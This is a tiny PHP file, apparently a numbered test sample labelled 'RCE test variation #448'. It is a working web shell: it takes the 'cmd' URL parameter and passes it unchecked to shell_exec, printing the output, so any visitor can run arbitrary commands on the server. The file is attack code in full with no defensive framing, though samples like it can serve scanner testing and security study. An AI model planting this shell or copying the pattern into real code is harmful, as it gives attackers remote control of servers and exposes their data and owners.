<?php
// RCE test variation #448
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>